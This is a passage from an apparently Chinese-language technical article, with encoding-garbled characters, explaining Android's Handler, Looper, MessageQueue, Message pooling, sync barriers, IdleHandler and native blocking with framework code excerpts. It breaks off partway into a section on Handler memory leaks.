<p><strong>ä¸ºä»€ä¹ˆloop()ä¸ä¼šå¯¼è‡´ANRï¼Ÿ</strong></p>
<ul>
<li>ANRæ˜¯å› ä¸ºä¸»çº¿ç¨‹çš„<code>Looper.loop()</code>åœ¨æŸæ¬¡æ¶ˆæ¯å¤„ç†æ—¶è€—æ—¶è¿‡é•¿</li>
<li>ä¸æ˜¯<code>loop()</code>æœ¬èº«å¯¼è‡´çš„ï¼Œè€Œæ˜¯<code>handleMessage()</code>ä¸­çš„ä»£ç å¤ªè€—æ—¶</li>
<li><code>queue.next()</code>åœ¨æ²¡æœ‰æ¶ˆæ¯æ—¶ä¼šé˜»å¡ï¼Œä¸æ¶ˆè€—CPU</li>
</ul>
<p><strong>loop()å¦‚ä½•é€€å‡ºï¼Ÿ</strong></p>
<ul>
<li>è°ƒç”¨<code>Looper.quit()</code>æˆ–<code>Looper.quitSafely()</code></li>
<li><code>quit()</code>ç«‹å³é€€å‡ºï¼Œä¸¢å¼ƒæ‰€æœ‰æœªå¤„ç†æ¶ˆæ¯</li>
<li><code>quitSafely()</code>å¤„ç†å®Œæ‰€æœ‰éå»¶è¿Ÿæ¶ˆæ¯åé€€å‡º</li>
</ul>
<h3 data-id="heading-4">Handlerï¼šæ¶ˆæ¯çš„ç”Ÿäº§è€…ä¸æ¶ˆè´¹è€…</h3>
<p>Handleræ˜¯å¼€å‘è€…æœ€ç›´æ¥æ¥è§¦çš„ç»„ä»¶ï¼Œå®ƒæ—¢æ˜¯æ¶ˆæ¯çš„<strong>å‘é€è€…</strong>ï¼Œä¹Ÿæ˜¯<strong>å¤„ç†è€…</strong>ã€‚</p>
<p>Handlerå¿…é¡»ä¸ä¸€ä¸ªLooperå…³è”ï¼Œæœ‰å‡ ç§æ„é€ æ–¹å¼ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ–¹å¼1ï¼šé»˜è®¤å…³è”å½“å‰çº¿ç¨‹çš„Looper</span>
<span class="hljs-comment">// å¦‚æœå½“å‰çº¿ç¨‹æ²¡æœ‰Looperä¼šå´©æºƒ</span>
<span class="hljs-type">Handler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handler</span>() {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleMessage</span><span class="hljs-params">(Message msg)</span> {
        <span class="hljs-comment">// å¤„ç†æ¶ˆæ¯</span>
    }
};

<span class="hljs-comment">// æ–¹å¼2ï¼šæ˜¾å¼æŒ‡å®šLooper</span>
<span class="hljs-type">Handler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handler</span>(Looper.getMainLooper()) {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleMessage</span><span class="hljs-params">(Message msg)</span> {
        <span class="hljs-comment">// åœ¨ä¸»çº¿ç¨‹å¤„ç†æ¶ˆæ¯</span>
    }
};

<span class="hljs-comment">// æ–¹å¼3ï¼šæŒ‡å®šLooperå’Œå›è°ƒ</span>
Handler.<span class="hljs-type">Callback</span> <span class="hljs-variable">callback</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handler</span>.Callback() {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">handleMessage</span><span class="hljs-params">(Message msg)</span> {
        <span class="hljs-comment">// å¤„ç†æ¶ˆæ¯ï¼Œè¿”å›trueè¡¨ç¤ºå·²å¤„ç†</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
};
<span class="hljs-type">Handler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handler</span>(Looper.myLooper(), callback);
</code></pre>
<p>æºç å…³é”®ç‚¹</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">Handler</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Callback callback, <span class="hljs-type">boolean</span> async)</span> {
    <span class="hljs-comment">// 1. è·å–å½“å‰çº¿ç¨‹çš„Looper</span>
    mLooper = Looper.myLooper();
    <span class="hljs-keyword">if</span> (mLooper == <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(
            <span class="hljs-string">"Can't create handler inside thread "</span> + Thread.currentThread()
                    + <span class="hljs-string">" that has not called Looper.prepare()"</span>);
    }
    
    <span class="hljs-comment">// 2. ç»‘å®šæ¶ˆæ¯é˜Ÿåˆ—</span>
    mQueue = mLooper.mQueue;
    
    <span class="hljs-comment">// 3. è®¾ç½®å›è°ƒå’Œå¼‚æ­¥æ ‡å¿—</span>
    mCallback = callback;
    mAsynchronous = async;
}
</code></pre>
<p>æ¶ˆæ¯çš„å‘é€ï¼šHandleræä¾›äº†ä¸¤ç±»æ–¹æ³•å‘é€æ¶ˆæ¯ï¼š</p>
<p><strong>sendMessageç³»åˆ—</strong>ï¼šå‘é€å¸¦æœ‰whatã€arg1ã€arg2ã€objç­‰æ•°æ®çš„æ¶ˆæ¯</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å‘é€ç©ºæ¶ˆæ¯</span>
handler.sendEmptyMessage(WHAT_CODE);

<span class="hljs-comment">// å‘é€å»¶è¿Ÿæ¶ˆæ¯</span>
handler.sendMessageDelayed(msg, <span class="hljs-number">1000</span>);  <span class="hljs-comment">// 1ç§’åæ‰§è¡Œ</span>

<span class="hljs-comment">// å‘é€æŒ‡å®šæ—¶é—´æ¶ˆæ¯</span>
handler.sendMessageAtTime(msg, SystemClock.uptimeMillis() + <span class="hljs-number">1000</span>);

<span class="hljs-comment">// å‘é€åˆ°é˜Ÿåˆ—å¤´éƒ¨ï¼ˆç´§æ€¥æ¶ˆæ¯ï¼‰</span>
handler.sendMessageAtFrontOfQueue(msg);
</code></pre>
<p><strong>postç³»åˆ—</strong>ï¼šå‘é€Runnableä»»åŠ¡</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç«‹å³æ‰§è¡Œ</span>
handler.post(() -&gt; {
    <span class="hljs-comment">// åœ¨ä¸»çº¿ç¨‹æ‰§è¡Œ</span>
    updateUI();
});

<span class="hljs-comment">// å»¶è¿Ÿæ‰§è¡Œ</span>
handler.postDelayed(() -&gt; {
    <span class="hljs-comment">// 1ç§’åæ‰§è¡Œ</span>
    doSomething();
}, <span class="hljs-number">1000</span>);

<span class="hljs-comment">// å¸¦tokençš„postï¼Œå¯ä»¥æ‰¹é‡å–æ¶ˆ</span>
<span class="hljs-type">Object</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
handler.postAtTime(runnable, token, SystemClock.uptimeMillis() + <span class="hljs-number">1000</span>);
</code></pre>
<p>åº•å±‚å®ç°postæ–¹æ³•æœ€ç»ˆä¹Ÿä¼šè½¬æ¢æˆMessage</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">post</span><span class="hljs-params">(Runnable r)</span> {
    <span class="hljs-keyword">return</span> sendMessageDelayed(getPostMessage(r), <span class="hljs-number">0</span>);
}

<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Message <span class="hljs-title function_">getPostMessage</span><span class="hljs-params">(Runnable r)</span> {
    <span class="hljs-type">Message</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> Message.obtain();
    m.callback = r;  <span class="hljs-comment">// Runnableå­˜å‚¨åœ¨callbackå­—æ®µ</span>
    <span class="hljs-keyword">return</span> m;
}
</code></pre>
<p>å½“Looperä»é˜Ÿåˆ—ä¸­å–å‡ºæ¶ˆæ¯åï¼Œä¼šè°ƒç”¨<code>handler.dispatchMessage()</code>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dispatchMessage</span><span class="hljs-params">(Message msg)</span> {
    <span class="hljs-comment">// 1. å¦‚æœMessageæœ‰callbackï¼ˆé€šè¿‡postå‘é€çš„Runnableï¼‰ï¼Œä¼˜å…ˆæ‰§è¡Œ</span>
    <span class="hljs-keyword">if</span> (msg.callback != <span class="hljs-literal">null</span>) {
        handleCallback(msg);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 2. å¦‚æœHandlerè®¾ç½®äº†å…¨å±€Callback</span>
        <span class="hljs-keyword">if</span> (mCallback != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// Callbackå¯ä»¥æ‹¦æˆªæ¶ˆæ¯å¤„ç†</span>
            <span class="hljs-keyword">if</span> (mCallback.handleMessage(msg)) {
                <span class="hljs-keyword">return</span>;  <span class="hljs-comment">// å·²å¤„ç†ï¼Œä¸å†å¾€ä¸‹ä¼ é€’</span>
            }
        }
        <span class="hljs-comment">// 3. æœ€åè°ƒç”¨å­ç±»å®ç°çš„handleMessage</span>
        handleMessage(msg);
    }
}

<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleCallback</span><span class="hljs-params">(Message message)</span> {
    message.callback.run();
}
</code></pre>
<p>å¤„ç†ä¼˜å…ˆçº§ï¼šMessage.callbackï¼ˆRunnableï¼‰â†’ 2. Handler.Callback â†’ 3. Handler.handleMessage()</p>
<p>ç®€å•ç†è§£ï¼Œå½“å‰handlerå¦‚æœæ¥æ”¶åˆ°çš„æ¶ˆæ¯ä¸­æœ‰Runnableï¼Œåˆ™æ‰§è¡Œï¼Œå¦åˆ™ï¼Œå¦‚æœhandlerè®¾ç½®äº†Callbackï¼Œåˆ™æ‰§è¡ŒCallbackï¼Œå¦åˆ™æ‰§è¡Œé‡å†™çš„handleMessageæ–¹æ³•ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/693c3fad7d9d497aae5cb1d732770260~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NzQ1ODkwMDIwNzk1NA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768449296&amp;x-signature=qBCMolDxU%2FErlSvT9%2F2Yb3uxuSY%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-5">Messageçš„å¤ç”¨æœºåˆ¶ä¸å†…å­˜ä¼˜åŒ–</h2>
<p>Messageæ˜¯Handleræœºåˆ¶ä¸­ä¼ é€’çš„æ•°æ®å•å…ƒï¼Œå®ƒçš„å¤ç”¨æœºåˆ¶ä½“ç°äº†Androidå¯¹æ€§èƒ½çš„ä¼˜åŒ–ã€‚
Messageçš„ç»“æ„:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Message</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Parcelable</span> {
    <span class="hljs-comment">// æ ‡è¯†ç¬¦ï¼Œç”¨äºåŒºåˆ†æ¶ˆæ¯ç±»å‹</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> what;
    
    <span class="hljs-comment">// ä¸¤ä¸ªæ•´å‹å‚æ•°</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> arg1;
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> arg2;
    
    <span class="hljs-comment">// ä»»æ„å¯¹è±¡</span>
    <span class="hljs-keyword">public</span> Object obj;
    
    <span class="hljs-comment">// ç›®æ ‡Handler</span>
    <span class="hljs-comment">/*package*/</span> Handler target;
    
    <span class="hljs-comment">// Runnableå›è°ƒ</span>
    <span class="hljs-comment">/*package*/</span> Runnable callback;
    
    <span class="hljs-comment">// ä¸‹ä¸€æ¡æ¶ˆæ¯ï¼ˆé“¾è¡¨ç»“æ„ï¼‰</span>
    <span class="hljs-comment">/*package*/</span> Message next;
    
    <span class="hljs-comment">// æ¶ˆæ¯æ± ï¼ˆé™æ€å˜é‡ï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Message sPool;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">sPoolSize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MAX_POOL_SIZE</span> <span class="hljs-operator">=</span> <span class="hljs-number">50</span>;
}
</code></pre>
<p>ä¸ºäº†é¿å…é¢‘ç¹åˆ›å»ºMessageå¯¹è±¡å¯¼è‡´å†…å­˜æŠ–åŠ¨ï¼ŒAndroidå®ç°äº†Messageå¯¹è±¡æ± ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Message <span class="hljs-title function_">obtain</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span> (sPoolSync) {
        <span class="hljs-keyword">if</span> (sPool != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// ä»æ± ä¸­å–ä¸€ä¸ªMessage</span>
            <span class="hljs-type">Message</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> sPool;
            sPool = m.next;
            m.next = <span class="hljs-literal">null</span>;
            m.flags = <span class="hljs-number">0</span>;  <span class="hljs-comment">// æ¸…é™¤IN_USEæ ‡å¿—</span>
            sPoolSize--;
            <span class="hljs-keyword">return</span> m;
        }
    }
    <span class="hljs-comment">// æ± ä¸ºç©ºï¼Œåˆ›å»ºæ–°å¯¹è±¡</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>();
}

<span class="hljs-keyword">void</span> <span class="hljs-title function_">recycleUnchecked</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// æ¸…ç©ºæ¶ˆæ¯å†…å®¹</span>
    flags = FLAG_IN_USE;
    what = <span class="hljs-number">0</span>;
    arg1 = <span class="hljs-number">0</span>;
    arg2 = <span class="hljs-number">0</span>;
    obj = <span class="hljs-literal">null</span>;
    replyTo = <span class="hljs-literal">null</span>;
    sendingUid = -<span class="hljs-number">1</span>;
    when = <span class="hljs-number">0</span>;
    target = <span class="hljs-literal">null</span>;
    callback = <span class="hljs-literal">null</span>;
    data = <span class="hljs-literal">null</span>;
    
    <span class="hljs-keyword">synchronized</span> (sPoolSync) {
        <span class="hljs-keyword">if</span> (sPoolSize &lt; MAX_POOL_SIZE) {
            <span class="hljs-comment">// æ”¾å…¥æ± ä¸­</span>
            next = sPool;
            sPool = <span class="hljs-built_in">this</span>;
            sPoolSize++;
        }
    }
}
</code></pre>
<p>ä½¿ç”¨æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ¨èï¼šä½¿ç”¨obtain()è·å–Message</span>
<span class="hljs-type">Message</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> Message.obtain();
msg.what = MSG_UPDATE_UI;
msg.obj = data;
handler.sendMessage(msg);

<span class="hljs-comment">// ä¸æ¨èï¼šç›´æ¥new Message()</span>
<span class="hljs-type">Message</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>();  <span class="hljs-comment">// å¯èƒ½é€ æˆå†…å­˜æŠ–åŠ¨</span>
</code></pre>
<h2 data-id="heading-6">é«˜çº§ç‰¹æ€§ä¸åº•å±‚æœºåˆ¶</h2>
<h3 data-id="heading-7">åŒæ­¥å±éšœ</h3>
<p>åŒæ­¥å±éšœæ˜¯ä¸€ç§ç‰¹æ®Šçš„æ¶ˆæ¯ï¼Œç”¨äº<strong>ä¼˜å…ˆå¤„ç†å¼‚æ­¥æ¶ˆæ¯</strong>ã€‚</p>
<ul>
<li><strong>åŒæ­¥æ¶ˆæ¯</strong>ï¼šæ™®é€šé€šè¿‡Handlerå‘é€çš„æ¶ˆæ¯</li>
<li><strong>å¼‚æ­¥æ¶ˆæ¯</strong>ï¼šé€šè¿‡<code>setAsynchronous(true)</code>æ ‡è®°çš„æ¶ˆæ¯</li>
<li><strong>åŒæ­¥å±éšœ</strong>ï¼šä¸€ä¸ªtargetä¸ºnullçš„Messageï¼Œé‡åˆ°å®ƒæ—¶ï¼Œä¼šè·³è¿‡æ‰€æœ‰åŒæ­¥æ¶ˆæ¯ï¼Œåªå¤„ç†å¼‚æ­¥æ¶ˆæ¯</li>
</ul>
<p>å…¸å‹åº”ç”¨ï¼šViewçš„ç»˜åˆ¶</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åœ¨ViewRootImplä¸­</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">scheduleTraversals</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (!mTraversalScheduled) {
        mTraversalScheduled = <span class="hljs-literal">true</span>;
        <span class="hljs-comment">// 1. è®¾ç½®åŒæ­¥å±éšœ</span>
        mTraversalBarrier = mHandler.getLooper().getQueue().postSyncBarrier();
        
        <span class="hljs-comment">// 2. å‘é€å¼‚æ­¥çš„ç»˜åˆ¶æ¶ˆæ¯</span>
        mChoreographer.postCallback(
            Choreographer.CALLBACK_TRAVERSAL, mTraversalRunnable, <span class="hljs-literal">null</span>);
    }
}
</code></pre>
<p>æºç ä¸­çš„å±éšœå¤„ç†</p>
<pre><code class="hljs language-java" lang="java">Message <span class="hljs-title function_">next</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">for</span> (;;) {
        <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) {
            <span class="hljs-type">Message</span> <span class="hljs-variable">prevMsg</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
            <span class="hljs-type">Message</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> mMessages;
            
            <span class="hljs-comment">// é‡åˆ°åŒæ­¥å±éšœ</span>
            <span class="hljs-keyword">if</span> (msg != <span class="hljs-literal">null</span> &amp;&amp; msg.target == <span class="hljs-literal">null</span>) {
                <span class="hljs-comment">// è·³è¿‡æ‰€æœ‰åŒæ­¥æ¶ˆæ¯ï¼Œåªæ‰¾å¼‚æ­¥æ¶ˆæ¯</span>
                <span class="hljs-keyword">do</span> {
                    prevMsg = msg;
                    msg = msg.next;
                } <span class="hljs-keyword">while</span> (msg != <span class="hljs-literal">null</span> &amp;&amp; !msg.isAsynchronous());
            }
            <span class="hljs-comment">// ... å¤„ç†æ‰¾åˆ°çš„æ¶ˆæ¯</span>
        }
    }
}
</code></pre>
<p>åˆ›å»ºå¼‚æ­¥æ¶ˆæ¯çš„æ–¹å¼</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ–¹å¼1ï¼šåˆ›å»ºHandleræ—¶æŒ‡å®š</span>
<span class="hljs-type">Handler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handler</span>(Looper.myLooper(), <span class="hljs-literal">null</span>, <span class="hljs-literal">true</span>);  <span class="hljs-comment">// ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºasync</span>

<span class="hljs-comment">// æ–¹å¼2ï¼šæ ‡è®°å·²æœ‰Message</span>
<span class="hljs-type">Message</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> Message.obtain();
msg.setAsynchronous(<span class="hljs-literal">true</span>);
handler.sendMessage(msg);

<span class="hljs-comment">// æ–¹å¼3ï¼špostå¼‚æ­¥ä»»åŠ¡</span>
handler.post(() -&gt; {
    <span class="hljs-comment">// å¼‚æ­¥ä»»åŠ¡</span>
    doAsyncTask();
});
</code></pre>
<p>è¿™é‡Œæ˜“æ··æ·†ï¼Œhandler.post()æœ¬èº«åªæ˜¯æŠŠRunnableåŒ…è£…æˆMessageå‘é€å‡ºå»ï¼Œè¿™ä¸ªMessageæ˜¯å¦æ˜¯å¼‚æ­¥çš„ï¼Œå–å†³äºï¼š</p>
<ol>
<li>Handleræœ¬èº«æ˜¯å¦æ˜¯å¼‚æ­¥çš„ï¼ˆæ–¹å¼1ï¼‰</li>
<li>æ‰‹åŠ¨è®¾ç½®Messageä¸ºå¼‚æ­¥ï¼Œå³doAsyncTask()æ˜¯å¼‚æ­¥çš„ï¼ˆæ–¹å¼3ï¼‰</li>
</ol>
<h3 data-id="heading-8">IdleHandlerï¼šç©ºé—²æ—¶æ‰§è¡Œçš„ä»»åŠ¡</h3>
<p>IdleHandlerå…è®¸åœ¨æ¶ˆæ¯é˜Ÿåˆ—ç©ºé—²æ—¶æ‰§è¡Œä»»åŠ¡ã€‚</p>
<ul>
<li><strong>å»¶è¿Ÿåˆå§‹åŒ–</strong>ï¼šç­‰ä¸»çº¿ç¨‹ç©ºé—²æ—¶å†åˆå§‹åŒ–éç´§æ€¥ç»„ä»¶</li>
<li><strong>æ‰¹é‡æ“ä½œ</strong>ï¼šæ”¶é›†å¤šæ¬¡å˜åŒ–ï¼Œä¸€æ¬¡æ€§å¤„ç†</li>
<li><strong>æ€§èƒ½ç›‘æ§</strong>ï¼šæ£€æµ‹ä¸»çº¿ç¨‹æ˜¯å¦å¡é¡¿</li>
</ul>
<p>ä½¿ç”¨æ–¹æ³•</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ·»åŠ IdleHandler</span>
Looper.myQueue().addIdleHandler(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageQueue</span>.IdleHandler() {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">queueIdle</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// åœ¨é˜Ÿåˆ—ç©ºé—²æ—¶æ‰§è¡Œ</span>
        doBackgroundWork();
        
        <span class="hljs-comment">// è¿”å›trueè¡¨ç¤ºç»§ç»­ä¿ç•™ï¼Œä¸‹æ¬¡ç©ºé—²è¿˜ä¼šæ‰§è¡Œ</span>
        <span class="hljs-comment">// è¿”å›falseè¡¨ç¤ºæ‰§è¡Œä¸€æ¬¡åç§»é™¤</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
});
</code></pre>
<p>åœ¨MessageQueueçš„<code>next()</code>æ–¹æ³•ä¸­ï¼š</p>
<pre><code class="hljs language-java" lang="java">Message <span class="hljs-title function_">next</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">for</span> (;;) {
        <span class="hljs-comment">// ... æ£€æŸ¥æ¶ˆæ¯é˜Ÿåˆ—</span>
        
        <span class="hljs-comment">// ç©ºé—²æ—¶å¤„ç†IdleHandler</span>
        <span class="hljs-keyword">if</span> (pendingIdleHandlerCount &lt; <span class="hljs-number">0</span> 
            &amp;&amp; (mMessages == <span class="hljs-literal">null</span> || now &lt; mMessages.when)) {
            pendingIdleHandlerCount = mIdleHandlers.size();
        }
        
        <span class="hljs-keyword">if</span> (pendingIdleHandlerCount &lt;= <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// æ²¡æœ‰IdleHandlerï¼Œç»§ç»­é˜»å¡</span>
            mBlocked = <span class="hljs-literal">true</span>;
            <span class="hljs-keyword">continue</span>;
        }
        
        <span class="hljs-comment">// æ‰§è¡ŒIdleHandler</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; pendingIdleHandlerCount; i++) {
            <span class="hljs-keyword">final</span> <span class="hljs-type">IdleHandler</span> <span class="hljs-variable">idler</span> <span class="hljs-operator">=</span> mPendingIdleHandlers[i];
            mPendingIdleHandlers[i] = <span class="hljs-literal">null</span>;  <span class="hljs-comment">// é‡Šæ”¾å¼•ç”¨</span>
            
            <span class="hljs-type">boolean</span> <span class="hljs-variable">keep</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
            <span class="hljs-keyword">try</span> {
                keep = idler.queueIdle();
            } <span class="hljs-keyword">catch</span> (Throwable t) {
                Log.wtf(<span class="hljs-string">"MessageQueue"</span>, <span class="hljs-string">"IdleHandler threw exception"</span>, t);
            }
            
            <span class="hljs-keyword">if</span> (!keep) {
                <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) {
                    mIdleHandlers.remove(idler);
                }
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-9">Nativeå±‚çš„å®ç°</h3>
<p>MessageQueueçš„é˜»å¡å’Œå”¤é†’å®é™…ä¸Šæ˜¯åœ¨Nativeå±‚å®ç°çš„ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Javaå±‚</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MessageQueue</span> {
    <span class="hljs-comment">// Nativeå±‚çš„æŒ‡é’ˆ</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> mPtr;  <span class="hljs-comment">// æŒ‡å‘NativeMessageQueue</span>
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">nativeInit</span><span class="hljs-params">()</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">nativeDestroy</span><span class="hljs-params">(<span class="hljs-type">long</span> ptr)</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">nativePollOnce</span><span class="hljs-params">(<span class="hljs-type">long</span> ptr, <span class="hljs-type">int</span> timeoutMillis)</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">nativeWake</span><span class="hljs-params">(<span class="hljs-type">long</span> ptr)</span>;
}

<span class="hljs-comment">// Nativeå±‚ï¼ˆC++ï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">NativeMessageQueue</span> : <span class="hljs-keyword">public</span> MessageQueue {
    <span class="hljs-comment">// ä½¿ç”¨Linuxçš„epollæœºåˆ¶å®ç°é«˜æ•ˆI/Oå¤šè·¯å¤ç”¨</span>
    Looper* mLooper;
    
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">pollOnce</span><span class="hljs-params">(<span class="hljs-type">int</span> timeoutMillis)</span> {
        mLooper-&gt;pollOnce(timeoutMillis);
    }
    
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">wake</span><span class="hljs-params">()</span> {
        mLooper-&gt;wake();
    }
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆè¦åœ¨Nativeå±‚å®ç°é˜»å¡ï¼Ÿ</strong></p>
<ol>
<li><strong>æ•ˆç‡æ›´é«˜</strong>ï¼šé¿å…Javaå±‚å¾ªç¯ç©ºè½¬æ¶ˆè€—CPU</li>
<li><strong>ç²¾å‡†å”¤é†’</strong>ï¼šä½¿ç”¨epollç­‰ç³»ç»Ÿè°ƒç”¨ï¼Œç²¾ç¡®æ§åˆ¶çº¿ç¨‹å”¤é†’</li>
<li><strong>ç»Ÿä¸€ç®¡ç†</strong>ï¼šä¸Inputç³»ç»Ÿã€Binderç­‰å…±ç”¨äº‹ä»¶å¾ªç¯</li>
</ol>
<h2 data-id="heading-10">å†…å­˜æ³„æ¼é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h2>
<p>Handlerå†…å­˜æ³„æ¼æ˜¯Androidå¼€å‘ä¸­æœ€å¸¸è§çš„é—®é¢˜ä¹‹ä¸€ã€‚</p>
<p>æ³„éœ²çš„æ ¹æœ¬åŸå› </p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> {
    <span class="hljs-comment">// éé™æ€å†…éƒ¨ç±»éšå¼æŒæœ‰å¤–éƒ¨ç±»å¼•ç”¨</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Handler</span> <span class="hljs-variable">mHandler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handler</span>() {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleMessage</span><span class="hljs-params">(Message msg)</span> {
            <span class="hljs-comment">// éšå¼æŒæœ‰MainActivity.thisçš„å¼•ç”¨</span>
            updateUI();
        }
    };
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {
        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
        
        <span class="hljs-comment">// å‘é€å»¶è¿Ÿæ¶ˆæ¯</span>
        mHandler.sendEmptyMessageDelayed(<span class="hljs-number">0</span>, <span class="hljs-number">60000</span>);  <span class="hljs-comment">// 60ç§’åæ‰§è¡Œ</span>
        
        <span class="hljs-comment">// å¦‚æœActivityåœ¨60ç§’å†…è¢«é”€æ¯</span>
